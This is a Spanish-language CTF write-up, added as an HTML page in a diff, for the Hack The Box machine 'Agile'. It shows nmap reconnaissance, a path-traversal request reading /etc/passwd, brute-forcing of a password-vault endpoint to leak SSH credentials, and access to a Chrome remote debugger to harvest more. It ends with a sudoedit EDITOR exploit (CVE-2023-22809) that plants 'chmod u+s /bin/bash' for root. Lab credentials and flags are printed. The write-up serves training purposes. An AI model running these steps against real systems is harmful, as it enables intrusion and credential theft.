@@ -1,0 +1,255 @@
+<!DOCTYPE html>
+<!-- saved from url=(0050)https://secret.club/2022/05/11/fuzzing-solana.html -->
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="theme-color" content="#111111"><meta property="og:image" content="/assets/twitter.png"><link rel="preload" href="./fonts.min.css" as="style"><link rel="stylesheet" href="./fonts.min.css"><link rel="alternate" type="application/atom+xml" title="juanchan.es RSS" href="https://juanchan.es">
+
+    <title>Máquina 1</title>
+
+
+    <meta name="generator" content="Jekyll v3.9.3"><meta property="og:title" content="maquinas/ctf"><meta name="author" content="addison"><meta property="og:locale" content="en_US"><meta name="description" content="maquinas/ctf juanchan.es"><meta property="og:description" content="maquinas/ctf juanchan.es"><link rel="canonical" href="https://juachan.es"><meta property="og:url" content="https://juachan.es"><meta property="og:site_name" content="juanchan"><meta property="og:type" content="article"><meta property="article:published_time" content="2022-05-11T07:00:00+00:00"><script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"addison"},"dateModified":"2022-05-11T07:00:00+00:00","datePublished":"2022-05-11T07:00:00+00:00","description":"maquinas/ctf juanchan.es","headline":"maquinas/ctf juanchan","mainEntityOfPage":{"@type":"WebPage","@id":"https://juanchan.es"},"url":"https://juanchan.es"}</script><style> * { margin: 0; padding: 0; box-sizing: border-box; color: inherit; text-decoration: inherit; } html { background: var(--bg-0); color: var(--text-0); width: 100%; text-rendering: optimizeLegibility; font-feature-settings: "kern" 1; font-feature-settings: "liga" 1; min-width: 100vw; overflow-x: hidden; -webkit-text-size-adjust: 100%; } @media all and (min-width:640px) { html{ font-size: 16.5px; } } @media all and (min-width:720px) { html{ font-size: 17px; } } @media all and (min-width:960px) { html{ font-size: 18px; } } body { max-width: 944px; margin: 0 auto; padding: 0 24px; font-family: "Charter", serif; } header, h1, h2, h3, .sans { font-family: 'Space Grotesk', Helvetica, sans-serif; } code, .mono, summary { font-family: 'Source Code Pro', monospace; font-weight: 500; } .img-right { float: right; height: 300px; padding-left: 2em } body > header { display: flex; justify-content: space-between; align-items: center; margin: 2em 0; } nav a { margin-left: 1.5em; letter-spacing: 0.07em; font-size: .9rem; } :root { --text-0: rgba(255, 255, 255, 87%); --text-1: rgba(255, 255, 255, 60%); --bg-0: #121212; --bg-1: rgba(255, 255, 255, 5%); --bg-2: rgba(255, 255, 255, 12%); --accent: #ef5350; --keyword: #b794f6; --string: #89a2f6; --literal: #f88478; --type: #f8819c; } @media (prefers-color-scheme: light) { :root { --text-0: rgba(0, 0, 0, 87%); --text-1: rgba(0, 0, 0, 66%); --bg-0: #fff; --bg-1: #f2f2f2; --bg-2: rgba(0, 0, 0, 12%); --keyword: #7c4dff; --string: #586ada; --literal: #d14641; --type: #bd00f8; } } .tags, .pagination > :nth-child(2) { margin-bottom: 2rem; } .tags, .pagination .mono { color: var(--text-1); font-size: 0.8rem; } .tags > a, .pagination .mono { color: var(--accent); } .pagination { display: flex; justify-content: space-between; flex-wrap: wrap-reverse; } .pagination > a { font-size: 0.9rem; display: inline-block; } .pagination .mono { letter-spacing: 0.07em; } article > :not(main) { font-size: 16px; } article > h1 { font-size: 2rem; margin-bottom: 12px; } .authors { position: absolute; margin-top: 4px; color: var(--text-1); } .authors > a { color: var(--text-0); } article > div > img { display: inline; object-fit: cover; height: 48px; width: 48px; border-radius: 100%; margin-right: 8px; background: var(--bg-1); } article > time { color: var(--text-1); position: absolute; margin: -24px 0 0 56px; } article > hr { width: 128px; border: 2.5px solid var(--bg-1); margin-top: 12px; } main { margin: 2rem 0; } main > :nth-last-child(2) { margin-bottom: 2rem; } main img, main video, main iframe, main object { max-width: 100%; height: auto; display: flex; margin: auto; } main iframe { width: 100%; height: 504px; } p, ul, ol { line-height: 1.35; margin-bottom: 1rem; } details + :not(details) { margin-top: 1rem; } details + h3, details + h2, details + h1 { margin-top: 1.2rem; } object { margin-bottom: 1rem; } h1, h2, h3 { position: relative; margin: 1.2rem 0 0.2rem 0; } h3, h2 { line-height: 24px; } main h1:before, h2:before, h3:before { content: "#"; color: var(--accent); font-weight: bold; float: left; margin-left: -19px; position: absolute; } h3:before { content: ""; margin-left: -17px; height: 10px; width: 10px; background: var(--accent); border-radius: 100%; top: calc(50% - 6px); } h1 { font-size: 1.3em; } h2 { font-size: 1.2em; } h3 { font-size: 1.1em; } p a, main li a { text-decoration: underline; } summary { margin-left: -17px; cursor: pointer; } summary::marker { color: var(--accent); } details :nth-child(2) { margin-top: 0.8rem; } ul { list-style: none; } ul li, ol li { padding-left: 1rem; margin: 0 0 0.2rem 1rem; } ul li::before { content: "•"; float: left; margin-left: -2rem; transform: scale(1.4); } blockquote { color: var(--text-1); font-style: italic; margin: 0 2em; } .footnotes { border-top: 1px solid var(--bg-1); padding-top: 1rem; } pre { border-left: 4px solid var(--bg-1); margin: 0 0 1rem -24px; padding-left: 20px; overflow-x: scroll; scrollbar-width: none; -ms-overflow-style: none; } pre::-webkit-scrollbar { width: 0; height: 0; } :not(pre) > code { background: var(--bg-1); padding: 2px 4px; } pre > code { display: inline-block; } code { font-size: 14px; } @media screen and (min-width: 640px) { code { font-size: 15px; } } @media screen and (max-width: 944px) { main iframe { height: calc((100vw - 24px) * 0.5625); } blockquote { margin: 0 0 0 1.25em; } ul li::before { margin-left: -1.25rem; } ul li { padding-left: 0.625rem; margin-left: 0.625rem; } ol li { padding-left: 0.25rem; } } .aside { color: var(--text-1); } @media screen and (min-width: 1074px) { article::before { background: radial-gradient( circle at center, var(--bg-1) 25%, transparent 25% ), transparent; background-size: 10px 10px; content: ""; display: block; height: 300px; width: 300px; position: absolute; transform: translate(-72px, -72px); z-index: -1; } article { padding: 24px 0 0 24px; margin: -24px 0 0 -24px; background: var(--bg-0); } article h1:first-of-type { margin-top: 0; } body > header { margin-bottom: 5em; } } @media screen and (max-width: 1584px) { .aside { position: relative; padding: 4px 0 4px 0; border-bottom: 1.5px solid var(--bg-1); border-top: 1.5px solid var(--bg-1); } } @media screen and (min-width: 1584px) { .aside { float: left; position: absolute; left: 0; transform: translate(calc(-100% - 28px), calc(-100% - 1rem)); width: 320px; text-align: right; clear: both; } footer { position: absolute; left: calc(100% + 24px); width: 320px; top: 0; } } code .gu, code .gh { font-weight: bold; } code .p { color: var(--text-1); } code .c, code .ch, code .cm, code .cp, code .cpf, code .c1, code .cs { color: var(--text-1); } code .o, code .ow { color: var(--keyword); } code .k, code .kn, code .kc, code .kp, code .kr, code .nt, code b { color: var(--keyword); font-weight: bold; } code .kt, code .kd, code .nb, code .nl, code .nv, code .vc, code .vg, code .vi, code .vm, code .gd { color: var(--type); } code .m, code .mb, code .mf, code .mh, code .mi, code .mo, code .il, code .se { color: var(--literal); } code .s, code .sa, code .sb, code .sc, code .dl, code .sd, code .s2, code .sh, code .si, code .sx, code .sr, code .s1, code .ss, code .gi { color: var(--string); }</style>
+    </head>
+
+
+<body><header align="center"><a href="/maquinas.html">Máquinas/CTF</a><nav><a href="/">Sobre mi</a></nav></header>
+
+
+    <article aria-label="Content" itemscope="" itemtype="http://schema.org/BlogPosting"><h1 itemprop="name headline">Máquina resuelta</h1><div itemprop="author" itemscope="" itemtype="http://schema.org/Person" style="height:48px"> <img itemprop="image" alt="main authors image" src="./agile.jpg"> <span class="mono authors"> <a href="https://secret.club/author/addison" itemprop="name">Agile</a> </span></div><time datetime="2022-05-11T07:00:00+00:00" itemprop="datePublished" class="mono"> Feb, 2023 </time><hr><main itemprop="articleBody" style="position: relative">
+
+
+
+
+
+
+<h2 id="comprobación-del-sistema-operativo">1. Comprobación del sistema operativo</h2>
+<pre><code>python whichSystem.py 10.10.11.203
+</code></pre>
+<p>Tiene como salida:</p>
+<pre class=" language-bash"><code class="prism  language-bash">10.10.11.203 <span class="token punctuation">(</span>ttl -<span class="token operator">&gt;</span> 63<span class="token punctuation">)</span>: Linux
+</code></pre>
+<p>&nbsp;</p>
+<h2 id="descubrimiento-de-puertos-y-servicios">2. Descubrimiento de puertos y servicios</h2>
+<pre><code>nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.203 
+</code></pre>
+<p>Obteniendo como salida:</p>
+<pre><code>Scanned at 2023-03-22 11:51:27 CET for 10s
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack ttl 63
+80/tcp open  http    syn-ack ttl 63
+
+Read data files from: /usr/local/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 10.39 seconds
+           Raw packets sent: 65763 (2.894MB) | Rcvd: 65535 (2.621MB)
+</code></pre>
+<p>&nbsp;</p>
+<h2 id="comprobamos-servicios-y-lanzamos-scripts-principales-contra-dichos-puertos">3. Comprobamos servicios y lanzamos scripts principales contra dichos puertos</h2>
+<pre><code>nmap -sCV -p22,80 10.10.11.203 
+</code></pre>
+<pre class=" language-bash"><code class="prism  language-bash">Starting Nmap 7.93SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at 2023-03-22 11:52 CET
+Nmap scan report <span class="token keyword">for</span> 10.10.11.203
+Host is up <span class="token punctuation">(</span>0.060s latency<span class="token punctuation">)</span>.
+
+PORT   STATE SERVICE VERSION
+22/tcp <span class="token function">open</span>  <span class="token function">ssh</span>     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 <span class="token punctuation">(</span>Ubuntu Linux<span class="token punctuation">;</span> protocol 2.0<span class="token punctuation">)</span>
+<span class="token operator">|</span> ssh-hostkey: 
+<span class="token operator">|</span>   256 f4:bc:ee:21:d7:1f:1a:a2:65:72:21:2d:5b:a6:f7:00 <span class="token punctuation">(</span>ECDSA<span class="token punctuation">)</span>
+<span class="token operator">|</span>_  256 65:c1:48:0d:88:cb:b9:75:a0:2c:a5:e6:37:7e:51:06 <span class="token punctuation">(</span>ED25519<span class="token punctuation">)</span>
+80/tcp <span class="token function">open</span>  http    nginx 1.18.0 <span class="token punctuation">(</span>Ubuntu<span class="token punctuation">)</span>
+<span class="token operator">|</span>_http-title: Did not follow redirect to http://superpass.htb
+<span class="token operator">|</span>_http-server-header: nginx/1.18.0 <span class="token punctuation">(</span>Ubuntu<span class="token punctuation">)</span>
+Service Info: OS: Linux<span class="token punctuation">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token keyword">.</span>
+Nmap done: 1 IP address <span class="token punctuation">(</span>1 host up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> 7.99 seconds
+
+
+Añadimos la siguiente linea al archivo /etc/hosts
+
+  10.10.11.203    superpass.htb
+</code></pre>
+<p>&nbsp;</p>
+<h2 id="observamos-la-página">4. Observamos la página</h2>
+<p>Observamos que se trata de una especie de gestor de contraseñas online. Podemos crear una cuenta para acceder, aunque también podemos utilizar directamente el usuario admin:admin. Una vez dentro, si le damos a la opción <code>Export</code>, nos genera la siguiente peticion, capturada a través de un proxy como Burp:</p>
+<pre><code>GET /download?fn=xxxx HTTP/1.1
+Host: superpass.htb
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate
+Accept-Language: es-ES,es;q=0.9
+Cookie: remember_token=14|1bc8d265b0016488ded7ae22f73e0360fca3e8c003b8938c03577f4de060185bfaa2fe561621e6bee2e5e43694de89fc2b4895da30a8d347766c95f9eb07ae60; session=.eJwljs2KwzAMhF_F6FwWK7JsJ0_R-1KKLSlNIP0hTk-l776GvcwwzPAxH7jOW2mLNZh-P-CObnC31srN4ATnzUoztz1vbn244-mKSC_dsazNvfrmBy7fy6lDdmsLTMf-tp5WhQk4KCYaxFNSEuNB5oIh-NIZiJWtzuTH6KuOJnmsmLBSUPVExhxVIubEEU05DoWsICoVy6PikIywaqqYu5RaBbPHyBZYss_CqkL9_vXdbP9_gwG-f1aORwo.ZBre5w.Z9q7KwrEQDwYoEqWhrTsh5NDptI
+Connection: close
+</code></pre>
+<p>Siendo el parámetro de <code>fn</code> el archivo a descargar. Podemos probar entonces a ejecutar un exploit del tipo <strong>LFI</strong>:</p>
+<pre><code>GET /download?fn=../../../../../../../etc/passwd HTTP/1.1
+Host: superpass.htb
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate
+Accept-Language: es-ES,es;q=0.9
+Cookie: remember_token=14|1bc8d265b0016488ded7ae22f73e0360fca3e8c003b8938c03577f4de060185bfaa2fe561621e6bee2e5e43694de89fc2b4895da30a8d347766c95f9eb07ae60; session=.eJwljs2KwzAMhF_F6FwWK7JsJ0_R-1KKLSlNIP0hTk-l776GvcwwzPAxH7jOW2mLNZh-P-CObnC31srN4ATnzUoztz1vbn244-mKSC_dsazNvfrmBy7fy6lDdmsLTMf-tp5WhQk4KCYaxFNSEuNB5oIh-NIZiJWtzuTH6KuOJnmsmLBSUPVExhxVIubEEU05DoWsICoVy6PikIywaqqYu5RaBbPHyBZYss_CqkL9_vXdbP9_gwG-f1aORwo.ZBre5w.Z9q7KwrEQDwYoEqWhrTsh5NDptI
+Connection: close
+</code></pre>
+<p>Obteniendo el siguiente resultado:</p>
+<pre><code>HTTP/1.1 200 OK
+Server: nginx/1.18.0 (Ubuntu)
+Date: Wed, 22 Mar 2023 11:53:41 GMT
+Content-Type: text/csv; charset=utf-8
+Content-Length: 1744
+Connection: close
+Content-Disposition: attachment; filename=superpass_export.csv
+Vary: Cookie
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+pollinate:x:105:1::/var/cache/pollinate:/bin/false
+sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
+usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+corum:x:1000:1000:corum:/home/corum:/bin/bash
+dnsmasq:x:108:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+mysql:x:109:112:MySQL Server,,,:/nonexistent:/bin/false
+runner:x:1001:1001::/app/app-testing/:/bin/sh
+edwards:x:1002:1002::/home/edwards:/bin/bash
+dev_admin:x:1003:1003::/home/dev_admin:/bin/bash
+_laurel:x:999:999::/var/log/laurel:/bin/false
+</code></pre>
+<p>&nbsp;</p>
+<h2 id="comprobamos-los-principales-archivos-del-sistema">5. Comprobamos los principales archivos del sistema</h2>
+<p>Si investigamos manualmente por el contenido de archivos comunes y demás, observamos que no nos aparece nada. Observamos que ejecutando diversas peticiones al principio en la página web, a veces nos aparecían unas ventanas de error, las cuales contenían, entre otras trazas de error, las siguientes rutas de archivos:</p>
+<pre><code>/app/venv/lib/python3.10/site-packages/flask/app.py
+
+/app/app/superpass/views/vault_views.py
+</code></pre>
+<p>Si mediante la vulnerabilidad anterior (<strong>LFI</strong>) observamos el contenido de ambos archivos, obtenemos que en el segundo existe el siguiente contenido, donde se puede observar una función en la que nos devuelven las contraseñas guardadas:</p>
+<pre class=" language-python"><code class="prism  language-python">@blueprint<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'/vault/row/&lt;id&gt;'</span><span class="token punctuation">)</span>
+@response<span class="token punctuation">(</span>template_file<span class="token operator">=</span><span class="token string">'vault/partials/password_row.html'</span><span class="token punctuation">)</span>
+@login_required
+<span class="token keyword">def</span> <span class="token function">get_row</span><span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    password <span class="token operator">=</span> password_service<span class="token punctuation">.</span>get_password_by_id<span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">,</span> current_user<span class="token punctuation">.</span><span class="token builtin">id</span><span class="token punctuation">)</span>
+
+    <span class="token keyword">return</span> <span class="token punctuation">{</span><span class="token string">"p"</span><span class="token punctuation">:</span> password<span class="token punctuation">}</span>
+</code></pre>
+<p>&nbsp;</p>
+<h2 id="explotación-de-la-vulnerabilidad-del-listado-de-contraseñas">6. Explotación de la vulnerabilidad del listado de contraseñas</h2>
+<p>Mediante <strong>Burp Suite</strong>, en la pestaña de <code>Intruder</code>, ejecutamos un ataque de fuerza bruta contra dicho endpoint. Introduciendo en el campo <code>Positions</code> el siguiente contenido:</p>
+<pre><code>GET /vault/row/§0§ HTTP/1.1
+Host: superpass.htb
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate
+Accept-Language: es-ES,es;q=0.9
+Cookie: remember_token=14|1bc8d265b0016488ded7ae22f73e0360fca3e8c003b8938c03577f4de060185bfaa2fe561621e6bee2e5e43694de89fc2b4895da30a8d347766c95f9eb07ae60; session=.eJwljs2KwzAMhF_F6FwWK7JsJ0_R-1KKLSlNIP0hTk-l776GvcwwzPAxH7jOW2mLNZh-P-CObnC31srN4ATnzUoztz1vbn244-mKSC_dsazNvfrmBy7fy6lDdmsLTMf-tp5WhQk4KCYaxFNSEuNB5oIh-NIZiJWtzuTH6KuOJnmsmLBSUPVExhxVIubEEU05DoWsICoVy6PikIywaqqYu5RaBbPHyBZYss_CqkL9_vXdbP9_gwG-f1aORwo.ZBrp6w.YEEEcyT0EPgdf0dYI9YpmHYnE1o
+Connection: close
+</code></pre>
+<p>Y estableciendo como <em>payload</em>, un dicccionario de numeros del 1 al 100. Observamos que en diferentes peticiones se producen códigos de respuesta y un número de bytes diferentes. Por lo que si comprobamos los recursos web, podemos encontrar en el endpoint <code>http://superpass.htb/vault/row/8</code> el siguiente valor:</p>
+<pre><code>agile corum 5db7caa1d13cc37c9fc2
+</code></pre>
+<p>Esto también lo podíamos haber averiguado con la herramienta de <em>fuzzing</em> <strong>wfuzz</strong>, empleando para ello los siguientes comandos. Creamos un diccionario con los posibles valores mediante el siguiente comando:</p>
+<pre><code>seq 1 50 &gt; dict
+</code></pre>
+<p>Lanzamos la herramienta:</p>
+<pre><code>wfuzz -c --hc=404 --hh=265 -t 200 -w numbers http://superpass.htb/vault/row/FUZZ
+</code></pre>
+<p>Con ella podemos observar los siguiente resultados, que de igual forma que antes, si observamos el <em>endpoint</em> <code>http://superpass.htb/vault/row/8</code> podemos observar el mismo resultado.</p>
+<pre><code>=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                           
+=====================================================================
+
+000000001:   302        5 L      22 W       263 Ch      "1"                                                                                               
+000000003:   302        5 L      22 W       263 Ch      "3"                                                                                               
+000000007:   302        5 L      22 W       263 Ch      "7"                                                                                               
+000000009:   302        5 L      22 W       263 Ch      "9"                                                                                               
+000000006:   302        5 L      22 W       263 Ch      "6"                                                                                               
+000000008:   302        5 L      22 W       263 Ch      "8"                                                                                               
+000000005:   302        5 L      22 W       263 Ch      "5"                                                                                               
+000000004:   302        5 L      22 W       263 Ch      "4"                                                                                               
+000000002:   302        5 L      22 W       263 Ch      "2"
+</code></pre>
+<p>Por lo que podemos acceder mediante el servicio ssh, con las credenciales <code>corum:5db7caa1d13cc37c9fc2</code>.</p>
+<p>&nbsp;</p>
+<h2 id="flag-de-usuario">7. Flag de usuario</h2>
+<p>Somos capaces de obtener la flag de usuario -&gt; <em>681ded2d328d40e1c3fb383ec8e59ebc</em></p>
+<p>&nbsp;</p>
+<h2 id="escalada-de-privilegios">8. Escalada de privilegios</h2>
+<p>Podemos probar a listar los puertos de la máquina, mediante el siguiente comando:</p>
+<pre><code>netstat -nat
+</code></pre>
+<p>Observando como nos devuelve una gran cantidad de puertos abiertos. Podemos mirar que servicios están activos en dichos puertos, mediante el siguiente comando:</p>
+<pre><code>ps faux
+</code></pre>
+<p>Viendo que en el puerto <code>41829</code> está corriendo el depurador remoto de <strong>Google Chrome</strong>:</p>
+<pre><code>runner      7449  0.1  2.6 33986524 104392 ?     Sl   11:36   0:00                      \_ /usr/bin/google-chrome --allow-pre-commit-input --crash-dumps-dir=/tmp --disable-background-networking --disable-client-side-phishing-detection --disable-default-apps --disable-gpu --disable-hang-monitor --disable-popup-blocking --disable-prompt-on-repost --disable-sync --enable-automation --enable-blink-features=ShadowDOMV0 --enable-logging --headless --log-level=0 --no-first-run --no-service-autorun --password-store=basic --remote-debugging-port=41829 --test-type=webdriver --use-mock-keychain --user-data-dir=/tmp/.com.google.Chrome.VhFqHR --window-size=1420,1080 data:, runner      7513  0.2  3.1 1184735616 126204 ?   Sl   11:36   0:01
+</code></pre>
+<p>&nbsp;</p>
+<h2 id="creación-de-portforwading">9. Creación de PortForwading</h2>
+<p>Mediante el servicio <strong>ssh</strong> podemos hacer un PortForwarding para traernos dicho puerto a nuestra máquina host, mediante el siguiente comando:</p>
+<pre><code>ssh corum@10.10.11.203 -L 5000:127.0.0.1:41829
+</code></pre>
+<p>Si abrimos ahora en navegador de <strong>Google</strong> en nuestra máquina host y buscamos en la barra superior de búsqueda <code>chrome://inspect</code> podemos configurar el puerto en el que hemos indicado el PortForwarding, es decir, <code>localhost:5000</code>.<br>
+Una vez hecho esto, en la sección <strong>Remote Target</strong> podemos ver como nos sale automáticamente un nuevo <code>target SuperPassword</code> con un subdominio llamado <strong>test.superpass.htb</strong>. Si seleccionamos la opción <em>inspect</em> y nos dirigimos al directorio <em>vault</em>, nos encontramos con dos credenciales, una de ellas para el usuario <code>edwards:d07867c6267dcb5df0af</code>, pudiendo entonces acceder a través del servicio <strong>ssh</strong>.</p>
+<p>&nbsp;</p>
+<h2 id="explotacion-de-suid">10. Explotacion de SUID</h2>
+<p>Una vez autenticados como el usuario <strong>edwards</strong> podemos ejectuar <code>sudo -l</code> para ver los permisos que tiene dicho usuario. Vemos que mediante el comando <strong>sudoedit</strong>, podemos editar dos archivos como si fuésemos el usuario <strong>dev_admin</strong>:</p>
+<pre><code>Matching Defaults entries for edwards on agile:
+env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User edwards may run the following commands on agile:
+    (dev_admin : dev_admin) sudoedit /app/config_test.json
+    (dev_admin : dev_admin) sudoedit /app/app-testing/tests/functional/creds.txt
+</code></pre>
+<p>Buscando por Internet podemos encontrar un <strong>CVE</strong> (CVE-2023-22809) mediante el cual nos permite convertirnos en el usuario <strong>root</strong> gracias a la variable de entorno <code>EDITOR</code>. Para ello deberemos de realizar los dos siguientes pasos:</p>
+<ol>
+<li>
+<p>Exportamos la variable de entorno al archivo <code>/app/env/bin/activate</code></p>
+<pre><code>export EDITOR='vim -- /app/venv/bin/activate'
+</code></pre>
+</li>
+<li>
+<p>Editamos uno de los dos archivos como el usuario <strong>dev_admin</strong>, añadiendo al principio la ejecución de una <em>bash</em>:</p>
+<pre><code>sudo -u dev_admin sudoedit /app/config_test.json
+</code></pre>
+<p>Añadiendo lo siguiente:</p>
+<pre><code>chmod u+s /bin/bash
+</code></pre>
+</li>
+<li>
+<p>Luego de unos instantes solo tenemos que hacer <code>bash -p</code> para conseguir una terminal como el usuario <strong>root</strong>.</p>
+</li>
+</ol>
+<p>&nbsp;</p>
+<h2 id="obtención-flag-usuario-root">11. Obtención flag usuario root</h2>
+<p>Somos entonces capaces de obtener el flag del usuario <strong>root</strong> -&gt; <em>276f62759da388b33043ec52faaaa53d</em></p>
+
+
+
+
+
+<p>&nbsp;</p><p>&nbsp;</p>
+</div>
+     <div class="footer-credits" style="display: flex; justify-content: flex-end">
+        <a> Made by Juan González </a>
+    </div>
+</div>
+</body></html>
